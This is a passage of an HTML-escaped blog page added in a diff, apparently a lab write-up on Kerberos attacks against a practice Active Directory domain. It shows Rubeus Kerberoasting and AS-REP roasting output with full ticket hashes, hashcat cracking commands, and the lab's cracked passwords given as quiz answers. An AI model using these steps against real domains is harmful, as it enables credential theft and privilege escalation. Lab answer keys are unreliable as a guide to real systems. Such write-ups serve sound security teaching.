+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Machine1.kirbi&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
+      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
+      BIID7Ve4Z+Wg7BgJBd6uHv1PGR0zSbVeyLeyGk9Rz3JdAvvC6/UeT3Mv/KJOKaReqD2Ek/FJ1kCMkEQC
+      FPrKW7ECUycLrL3Lo23V90o+afUSH3nyjYIu7ia3OeRwKIJBRB8b48/MpljBfs1pWPXAqu2Jn9v8V7O1
+      EOA9p5nAnZqgXUUe2KfwV8whhoP2TJ6Nl2in/I+jEu3GW50UoBzMfRnVJ6XYzhUs/Dckobdg98+8UfJA
+      Drvn4RKaUKUqC+YW5trSXikF5pkM0/jitFAv7bL36qNudbbTVuP/xGAeSmY7N278s3Q2JNd0y4RKVWo5
+      8fvdPUObJin9cIPgzwKADQ3p2qPO9Qx83V3gWx7NMFhM+cMvhdSHJKLhEbqORqaZpFGDsz76T0tgfZMz
+      bNCzQI4oOdLfpBBmib1irHdPXJ8At1REl3D72ns+Ljp6BPlW7hsKLOJRQfEgnl4uZbDgpaKUc1EDsbPR
+      rr2XonyGhROOez8F1WNa6k103gicRPuncuQ9uxnHnMi1tmre3pJygYDG8XYrxU75ULqTUnlwXLRgv0Q3
+      hPgx5BxLv0if/FgsgGt7d3N9ifVs7k+0f0Ot+y3yVn/kqwgEckIFGD7rq7VzLjc1M/nUTM8YFMMk0XPz
+      t8k7yuTjZamNJ5T+QFlAGq1QEky0MBIv6Rw5LBSVSyp6mLXKAciRsaYZxSwfmQMtTQvpzsxA8DrN6ctH
+      R4WP40FhtP1HyxglxWvP5EkX+yYG1ub1lEiyTE0Oj2faGSH1jEQ4ME2H4fYeyPuHYCwZRPydYJcWOVqd
+      SAMV8gbxTkiVs+nEtuVkCeh/8hqM7XHjNOyYgw7TKNcw5REvBnlnijSpMxai6ovF9jQF2mYjTpEGAHDG
+      deCCGEyub3dTjoSmMxCGXvsNAdIVlMx36+EgTzcWBv1mo1nJ8Oj2mLQCeHQlYMWNKTkjo/S4F+i2yEP7
+      fYpWx/2qGWymXOhXtvrn6HTGJ2jC8B1ShyCxpzpR7aYz1wj/NIIoYv/ch3K33AGe6vTlaFoR/pWQNj1W
+      +uhof3qB5T4eP2jjiarXsmgqMKpvDebWmwCAMIK1nrkEv19S6/o+Quv/D5+3pv2VWz/XHjkbzFLjVm0M
+      2ScYtgAMxqACLQWbZSdIW6YrfJL0o3BBQDIRBABfaT9CTwMAkfzMyIDIvo/2LswkGIjnkGy+UQkxv71e
+      pirudE+ryy3i+bxpYfDR3M1yEXlsP2GwN/aSEJVWdP0T1jje778x1KyJGVT4wcVb+ruGlGSbC1+QXqAn
+      iq06kEXPW4Q5sVdn90VW/45K8moA3S/wABp4gfBDU7h4gSHw28gYmCMX6LruWIQmF6OB8jCB76ADAgEA
+      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIKqFLPWCNf605+d6eE9fmtjErMl9YpxQCLLP
+      guIJRP88oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
+      GA8yMDIyMDYyMTA2MDI0OFqmERgPMjAyMjA2MjExNjAyNDhapxEYDzIwMjIwNjI4MDYwMjQ4WqgSGxBD
+      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;answer-the-questions-below-2&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Answer the questions below&lt;/h5&gt;
+
+&lt;p&gt;&lt;strong&gt;Which domain admin do we get a ticket for when harvesting tickets?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Administrator&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Which domain controller do we get a ticket for when harvesting tickets?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CONTROLLER-1&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-4---kerberoasting-w-rubeus--impacket&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 4 - Kerberoasting w/ Rubeus &amp;amp; Impacket&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Notes&lt;/strong&gt;: Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts use a tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd Downloads&lt;/code&gt; Navigate to Rubeus&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rubeus.exe kerberoast&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   ______        _
+  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_____ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     | |
+   _____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; ___ | | | |/___&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | |  &lt;span class=&quot;se&quot;&gt;\ \|&lt;/span&gt; |_| | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ____| |_| |___ |
+  |_|   |_|____/|____/|_____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;____/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___/
+
+  v1.5.0
+
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Action: Kerberoasting
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; NOTICE: AES hashes will be returned &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;AES-enabled accounts. 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;         Use /ticket:X or /tgtdeleg to force RC4_HMAC &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;these accounts. 
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Searching the current domain &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Kerberoastable &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Total kerberoastable &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt; : 2
+
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SamAccountName         : SQLService
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DistinguishedName      : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SQLService,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CONTROLLER,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; PwdLastSet             : 5/25/2020 10:28:26 PM
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Supported ETypes       : RC4_HMAC_DEFAULT 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Hash                   : &lt;span class=&quot;nv&quot;&gt;$krb5tgs$23$*&lt;/span&gt;SQLService&lt;span class=&quot;nv&quot;&gt;$CONTROLLER&lt;/span&gt;.local&lt;span class=&quot;nv&quot;&gt;$CONTROLLER&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;/SQLService.CONTROLLER.loca 
+                             l:30111&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$10A48FD8265244A42C55AAF85088EED4$A13B7B72640901518F581A4C4AB94B7368F87D&lt;/span&gt; 
+                             0C058111140CA3D660DBF8627C663B8E912011CB8BA31195E02B29F155C119AE917515C5604AA2EA
+                             0C4FF99CFB84846ED1245F0A03116B7D340EAD8BFC16D9910CE62D2D3F47ED68F7DDB9953C29DBA7
+                             80F454583177670BC4BF74D2D53E8437C2D1B4B06A495612FFB51BFB113A7763279FEFFC9BE7013D
+                             647D990870219728E7C7A4E02204F7A56021D8549339AAA7AD8690715723C6B8E3C0C9B69B072047
+                             362FB698E4335F337DEB25188FB653806AD1F2B922609E044F3E9419B2376386F176F52443A0A2DE
+                             63254CE97A89634CA1B4F378E1CEEBD8CC33DBC4A0A8F98EB7702A4CAB7B3B2803980DF8B2BD5966
+                             CB21FAB6E1676D964C6BBF36FDC63A70C086660E54080F5E9DDC04B5B626828CD25D157010470BE4
+                             8AE842682BAD516E2ED6205057ACC859C9B10867B238A44EB03DBB0DEA5DC599944AF6799C90FD23
+                             2A9E5C16C701CAE4F25039F463534361ABCA3EE3ADE22CFDB78A6553687B4038C3F089D02CA2688B
+                             AEF8754D915E89A500FEA80CAE2CBB5FA2579D1F47E3211FFAD40E6D7B28D26B544C4FC8E2480845
+                             2BA8AD332CE39EA255D101CA976416B909DBA8B7B3055C30B48711CD1960DA3A7B577CE261C33CC9
+                             B044555C90B2D7CBD720231B2457468CFDEC7245459897F973F04B705F1E3C08B3869F9EA48B3485
+                             B13836DB924FD94900BC01F627FE302A2403F666D2995C7C33F2BB5808EE8F7A41B452D9A57015E6
+                             4BE7196D3964D0856C4791949DEF76C07F170D89071089D8DB7C8AD964DAE51351D89DE0117763C8
+                             2F4167B3399B9FC9CD60CE6E4FD41F0972B01C59D733EB20749A3140A59DAD984DB93DA65412484D
+                             B8D4F280F32525C74DA76C7E2C85A65806F9D5F65573432F38CB81D89C568C83EFB0222F224C30BA
+                             027D2C632C3E2EA17F40AF31610FD05C48DA5A194E53C84D164D82DFADABD2FFE962C2FED4A284CA
+                             C1D3DB4438DF370B77941F16383D5905995FF6EE75392694EE643A91B40E788D55FE49B5F42558A7
+                             E28A7DDFFF164FAE752DFE5C6716CD622E7153EA07EDD9257B90FF648909DCBAEB096064D648CB2C
+                             A40A821A29F431A78AA1527A26906EAA8FECB5DCD0F1F95194E286609E885970214BC5A3E8DA93F3
+                             B918C8696F47F2A09C98F2045398005D92550BB526187E6FFAEB0F99E116C8739B0418661CE11900
+                             AD1ABBC4B14578A88C5B1226D445721EEDFD9E2E40059F39EA9E909983153A93840DDC51812C6088
+                             169BA4E337085E14F19992222BF38BFD6952E2A01698E0906A609B6C621F6C3198ACA5316110A601
+                             D0A5964EDE76035806C8407A5631C604C1A1CEF151703E6B5AB88E09F92910B2ABDAB2A7808658A8
+                             2B82904E0652DB118E7AD3129118267AB9B1784BE037104A1D70A70516B25F6EBB2E2DF3C1BDF092
+                             34A92B0C87F89BBB965F6B33EA95A67A5B2D6035501F06635C4821D29F898037E4EDA1550E78635A
+                             DC9C948639C9F044F8307F75145F97803CDFCC84195DBF45A5376D468663ADD530468BDC0CC71CFD
+                             D4C44C8DC85A12BBBCA682BCF7B304D4C2DB233956BEA3629449624B08D238BC2E736DBBEDAF22F3
+                             3266D49778BA77C241D6212D6D4A602F85E588B1ED7B6819E2357503CA
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SamAccountName         : HTTPService
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DistinguishedName      : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;HTTPService,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CONTROLLER,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; PwdLastSet             : 5/25/2020 10:39:17 PM
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Supported ETypes       : RC4_HMAC_DEFAULT
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Hash                   : &lt;span class=&quot;nv&quot;&gt;$krb5tgs$23$*&lt;/span&gt;HTTPService&lt;span class=&quot;nv&quot;&gt;$CONTROLLER&lt;/span&gt;.local&lt;span class=&quot;nv&quot;&gt;$CONTROLLER&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;/HTTPService.CONTROLLER.lo
+                             cal:30222&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$00C460FCBDD8532B7A0F9A502A8585D5$35422C64B1A19B32A355E15A3885F68AE2BC&lt;/span&gt;
+                             90C7D58777399857F9622E5B599780C023170A603247E6B41787566631B54D35CE7256E1A5F1710E
+                             01E02C5513418542B610EEB27376ABD99728090A24F31CFE740831DD9A6E0DC7E802F12633719385
+                             7C37A368CE01CBE6BAD9B50462051CABC5D5C107E2F91962DA80CC9C9F3E7864E3E75DA132E0AF88
+                             DD7FF006DFB8C060CED59521371801EFEF511D54D3252C5D286593ADB05EEF1B02C2084D4EA14C4D
+                             B7451E23660554DF737207676EC1870B93F11C3C357B1F392FE79950DD506DD3885C5339589C6577
+                             980D4AF584EF2B1434ABFE99018E469BD286D9F8BC97DC3DF1C12D04D74BA7D1392C1E8F343F5A16
+                             3602BD0F3D55C99D9CF443CE9FA4D9CDF18B7380B1C30388F5E78DFFF8AB42F7B8021A3C00DCA85A
+                             31E867D6FEB8AAFBB7CA8AEFE6E2680C3450E0AA0C6296917A7F6062C8243468EF9BAD39465DB1CD
+                             FC01DFD834B576B39FC6EE5616E3236C3FF7BFFAEC994B9A1C67C8609441C70B113537851A7B7F41
+                             A74AB572C1FE6AFA8BE01B7F744C8FCD895AD375569BA03C643D0680D52FE96416EBE8DE675C9064
+                             DDED71F31E527486BF396866CBF1EE1F1C2D6000CC54808D338A9D569DC448FDFD42B3355B3DE33E
+                             745D885DFAFF6C917E6284AE1B14C14BAAD4680C8D52833D876A9EBC918A4E1092CD8138670E63AC
+                             B725F21A9D96AC87604432F995DB88CF2047A6128B076591A12927D9F49AECA0B0C03F401D6B49A0
+                             3F7B02617344E614A28A2B259871AE53022941741B4C2E55BFBF7F623BFF56216C8420FA4B3281EC
+                             665D6AA5219C2D57BE48C82F2FFC89AFAE2C0068CB7804BF17F20BF658BA39D121C09D046C947278
+                             A797A85573B254AE3E7A2B81675B4589E4FB9C5F1051D9A2A6673B7B97C566E7BFF717CEF524CD83
+                             49CA06957A5B686FF426C6AC6B88FAD6CC6A3454920AD7A45EF38E216ECA8E6C01D9E80DED26DA32
+                             4E3E422D187393ED2DC18F1BBE516C545F32B5770550351DF19C31FFDB9BC02D33AD41C9B61ED501
+                             AD4F5BACC5CE933B7899EA55E08E2098FA2186FC1E9D26076F64A7C14E0A91419F2B4956C21EC9D1
+                             7D354B22CDB3B593130BC7C1F49BE88560581EBF425A12F8AA096D11FEAF94D3522D89E83DE7AD31
+                             BB4A017D5720155EE8BA88BB9FF4677981FD0AB1EA54E2F67385A240E87A5BA72BD6608C00C7D6E4
+                             F3BBC571120DED4A041E59C30514C78D7BB80095496D3E60B5BCF5F99767FB3BB57705EE47FFC79C
+                             E7F1D3858CFEB705B28C4D065466FBD70B8A6223CF82023E7BD68FC71896F4C0F38D43020C8603E6
+                             7AA33F23F60C60A698B5539089034B227127F58B724DA9A92174AF93673328E27893DBB7784652FA
+                             4AFAA2CDCD14299854DD0073669E4848F8C6BDDA2C423FD98924555A5C76A7FC341BF35441EBF4DD
+                             F40CFE0709B01F172883BA056EAF9DA6526CCBF3C9E6E893B229ECE0A52A40E18668B25DD025054F
+                             F7F2DA40506169AA16B837F25C4C3F66DA7782A92FA59764350BCD1701961D0417875FB673B85770
+                             4D945026C5D8B07CE289819EC927AFE786DA4DCD03BFD3688B1E2951D6BB9D13189B9D794F88ED68
+                             A5CFDA860792FD590B334BF24A6EE0083DFD88640F349C0DD5A81A8092A9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the HTTPService Password?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 13100 -a 0 httpservicehash.txt Pass.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Summer2020&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;What is the SQLService Password?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 13100 -a 0 sqlservicehash.txt Pass.txt&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;MYPassword123#&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;task-5---as-rep-roasting-w-rubeus&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Task 5 - AS-REP Roasting w/ Rubeus&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;AS_REP Roasting dumps the krbasrep5 hashes of users that have Kerberos pre-auth disabled.&lt;/li&gt;
+  &lt;li&gt;Rubeus has a simple and easy to understan comming to AS-REP roast and attack users with pre-auth disabled.&lt;/li&gt;
+  &lt;li&gt;After dumping hash from Rubneus we use hashcat in order to crack the krbasrep5 hash&lt;/li&gt;
+  &lt;li&gt;Others tools we can use such as kekeo and Impacket’s GetNPUsers.py. Rubeus is easiar to use because it automaticalld finds AS-REP Roastable users where with GETNPUsers you have to enumerate the users beforehand and know which users are AS-REP Roastable.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;as-rep-roasting-overview&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;AS-REP Roasting Overview&lt;/h3&gt;
+
+&lt;p&gt;During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/kerberos04.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;dumping-krbasrep5-hashes-w-rubeus&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Dumping KRBASREP5 Hashes w/ RUBEUS&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd Downloads&lt;/code&gt; - nagivate to Rubeus&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Rubeus.exe asreproast&lt;/code&gt; - This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;controller&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator@CONTROLLER-1 C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt;Rubeus.exe asreproast
+
+   ______        _
+  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_____ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     | |
+   _____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; ___ | | | |/___&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+  | |  &lt;span class=&quot;se&quot;&gt;\ \|&lt;/span&gt; |_| | |_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ____| |_| |___ |
+  |_|   |_|____/|____/|_____&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;____/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___/
+
+  v1.5.0
+
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Action: AS-REP roasting
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Target Domain          : CONTROLLER.local
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Searching path &lt;span class=&quot;s1&quot;&gt;&apos;LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;AS-REP roastable &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SamAccountName         : Admin2
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DistinguishedName      : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Admin-2,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CONTROLLER,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using domain controller: CONTROLLER-1.CONTROLLER.local &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fe80::edde:c433:95ab:1b34%5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Building AS-REQ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;w/o preauth&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;: &lt;span class=&quot;s1&quot;&gt;&apos;CONTROLLER.local\Admin2&apos;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] AS-REQ w/o preauth successful!
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AS-REP &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;:
+
+      &lt;span class=&quot;nv&quot;&gt;$krb5asrep$Admin2&lt;/span&gt;@CONTROLLER.local:F1DD06F612FDEF33DEED86E4BE4F1FBF&lt;span class=&quot;nv&quot;&gt;$25CB8CBC1693&lt;/span&gt;
+      7A5BB84C798B8920C37496A0762C288524FB8A324370C07A5142C648FC8102A1E7D545F2DBD978C6
+      F52DD66A1796AD678C2156C4165124C3EB334E7E6CD7F7A85F3FDE6985ECD71941BDA9034F65BC1A
+      3D4A332FF012DBBB6A4D68715991ED2F10373B625A0DEBF17AD9A6960E2EE8223D09A89963CD257A
+      6C48077E8F1A9D7EEA81F4D96676CC9B1F9332CC54A647CF76E94A56B2636ECC6FD34332683C2EB4
+      E57271D0002742864EFE00D1BF87A20A7AE10C7EDF004C68A68A89F280B2563454231BC99E6D5261
+      9E2BD0C3F72BBC9A7F50611D742A9FC4C53E7811F737057523098A9C418ABCFC17DD778E3CD3
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SamAccountName         : User3
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DistinguishedName      : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;User-3,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CONTROLLER,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using domain controller: CONTROLLER-1.CONTROLLER.local &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fe80::edde:c433:95ab:1b34%5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
